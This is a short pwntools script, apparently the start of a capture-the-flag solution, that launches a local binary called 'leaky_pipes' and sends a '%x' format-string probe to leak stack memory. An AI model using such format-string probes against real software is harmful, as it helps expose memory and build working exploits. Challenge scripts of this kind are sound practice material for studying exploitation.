from pwn import *

context.binary = './leaky_pipes'

p = process('./leaky_pipes')

p.sendlineafter(">", b'%x')

p.interactive()
